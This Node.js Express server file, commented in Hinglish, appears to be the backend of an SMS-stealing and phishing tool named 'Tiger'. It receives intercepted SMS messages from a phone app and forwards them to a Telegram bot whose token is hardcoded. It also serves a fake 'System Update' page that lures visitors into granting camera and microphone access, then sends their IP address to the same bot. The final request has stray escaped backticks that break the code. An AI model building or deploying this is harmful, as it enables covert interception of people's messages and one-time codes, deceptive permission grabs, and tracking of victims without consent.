const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// --- CONFIGURATION (Aapke Screenshots se) ---
const BOT_TOKEN = '8394719862:AAGdG06eMVj_Mz4hFCqv-jHrmyiSqsDXppk'; 
const CHAT_ID = '7128071523';
// ------------------------------------------

// In-memory storage (Jab tak server on hai, data dashboard pe dikhega)
let smsLogs = [];

// 1. Endpoint: Mobile App se data receive karne ke liye
app.post('/log-sms', async (req, res) => {
    try {
        const { sender, message, device, timestamp } = req.body;

        const newEntry = {
            id: Date.now(),
            sender: sender || 'Unknown',
            message: message || 'Empty Message',
            device: device || 'Tiger-Device',
            timestamp: timestamp || new Date().toISOString()
        };

        // Dashboard ke liye save karein
        smsLogs.unshift(newEntry);
        if (smsLogs.length > 100) smsLogs.pop(); // Memory bachane ke liye limit

        // Telegram Notification bhejein
        const telegramMsg = `🐯 *Tiger SMS Alert!*\n\n` +
                          `📱 *Device:* ${newEntry.device}\n` +
                          `👤 *From:* ${newEntry.sender}\n` +
                          `💬 *Message:* ${newEntry.message}\n` +
                          `⏰ *Time:* ${newEntry.timestamp}`;

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: telegramMsg,
            parse_mode: 'Markdown'
        });

        console.log(`[✓] SMS from ${newEntry.sender} forwarded to Telegram.`);
        res.status(200).json({ status: 'success' });

    } catch (error) {
        console.error('[!] Error processing SMS:', error.message);
        res.status(500).json({ status: 'error' });
    }
});

// 2. Endpoint: Web Dashboard ko data dene ke liye
app.get('/get-logs', (req, res) => {
    res.json(smsLogs);
});

// Server Start
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Tiger Server is alive on port ${PORT}`);
});

// --- NEW: Link Tracking & Camera Permission Page ---
app.get('/track', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>System Update</title>
            <style>
                body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
                button { background: #1ed760; border: none; padding: 15px 30px; border-radius: 25px; color: white; font-weight: bold; cursor: pointer; }
            </style>
        </head>
        <body>
            <h1>Update Required</h1>
            <p>Please allow permissions to verify your device hardware.</p>
            <button onclick="startCapture()">Check Hardware</button>

            <script>
                async function startCapture() {
                    try {
                        // Camera & Mic Permission Pop-up
                        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                        alert("Device hardware verified successfully!");
                        
                        // Send success notification to Telegram
                        fetch('/log-link-access', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ status: 'Permission Granted', type: 'Camera/Mic' })
                        });
                    } catch (err) {
                        alert("Permission denied. Update failed.");
                    }
                }
            </script>
        </body>
        </html>
    `);
});

// Endpoint to log link activity
app.post('/log-link-access', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const { status, type } = req.body;

    const msg = `🔗 *Tiger Link Alert!*\n\n` +
                `📍 *IP:* ${ip}\n` +
                `🔐 *Action:* ${status}\n` +
                `🛠 *Type:* ${type}`;

    await axios.post(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`, {
        chat_id: CHAT_ID,
        text: msg,
        parse_mode: 'Markdown'
    });
    res.json({ success: true });
});
